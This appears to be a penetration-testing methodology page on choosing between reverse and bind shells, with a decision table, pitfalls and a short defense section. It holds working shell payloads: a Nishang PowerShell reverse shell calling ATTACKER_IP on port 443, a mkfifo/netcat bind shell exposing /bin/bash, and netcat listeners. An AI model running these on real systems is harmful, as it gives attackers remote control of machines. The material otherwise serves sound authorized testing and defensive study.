---
layout: page
title: "Reverse and Bind Shells"
subtitle: "Choosing the connection direction and standing up the matching listener"
permalink: /methodology/shells-and-transfers/reverse-and-bind-shells/
---

**Purpose:** decide whether the target should call back to us (reverse shell) or whether we should connect to a port it opens (bind shell), then set up the listener for that choice. The direction is driven almost entirely by which connections the target's network allows.

## Workflow

1. Establish what the target can reach. Test outbound connections to a host we control on common ports such as 443 and 80.
2. If outbound traffic is allowed, plan a reverse shell. The attack host runs a listener and the target initiates the connection.
3. If the target is reachable inbound on a port and we already sit on its network segment, plan a bind shell. The target runs the listener and we connect in.
4. Start the listener before triggering the payload, and confirm it is listening.
5. Trigger the payload, then confirm the session is stable before running anything intrusive.

### Reverse shell listener

```bash
nc -lvnp 443
```

Port 443 is a deliberate choice. Outbound HTTPS is usually permitted, so a callback on that port is more likely to pass the egress rules than a high random port.

### Reverse shell payload on Windows (Nishang)

```powershell
powershell -ep bypass -c ". .\nishang.ps1; Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 443"
```

Run the listener first. The PowerShell one-liner that opens the same kind of connection without a script file is broken down in [Payload Basics](/methodology/shells-and-transfers/payload-basics/).

### Bind shell with a named pipe

On the target, a listener is opened on a fixed port:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET_IP 7777 > /tmp/f
```

From the attack host, connect to it:

```bash
nc -nv TARGET_IP 7777
```

The `nc -l <address> <port>` form is Ncat syntax. Traditional netcat binds with `nc -l -p <port>`.

## Decision points

| Factor | Reverse shell | Bind shell |
|---|---|---|
| Who listens | Attack host | Target |
| Who initiates | Target calls out | Attack host connects in |
| Usual firewall condition | Outbound allowed, inbound blocked | A specific inbound port is reachable |
| Position required | Any host with an outbound route | Already inside the target segment |
| Typical port choice | 443, 80, other allowed egress ports | A port that the target firewall admits |

> Outbound-only egress is the common case on hardened networks. If the target cannot reach us on any port we allow, consider a pivot instead of trying more payloads.
{: .tip }

## What to look for

- Whether the egress test succeeds on several ports, not just one
- Whether a firewall with deep packet inspection or Layer 7 visibility is in the path
- Whether a listener already exists on the target for a bind shell, and if not, whether we can start one
- Whether the shell survives a short idle period, which indicates a stable connection

## Pitfalls

- A reverse shell on 443 can still be blocked when the firewall inspects application-layer content. A failed callback is not proof that outbound traffic is blocked on every port.
- Bind shells need inbound access. Host firewalls on Windows and Linux usually drop unsolicited inbound connections, so a bind shell only works where a port is already allowed.
- Admins commonly place NAT and strict inbound rules at the perimeter. A bind shell from outside the network will fail for that reason.
- Netcat variants differ in flags. Confirm the syntax of the binary that is actually installed.

> Bind shells from outside the network are generally not viable. Confirm the target is inside the scoped network before relying on one.
{: .warning }

## Defense and prevention

Restrict egress from servers to the destinations they need, so that a reverse connection from a server fails by default. Use host firewalls to limit inbound listening ports. Monitor for unusual outbound connections, particularly from servers, and for new listening sockets on hosts that should not open them.
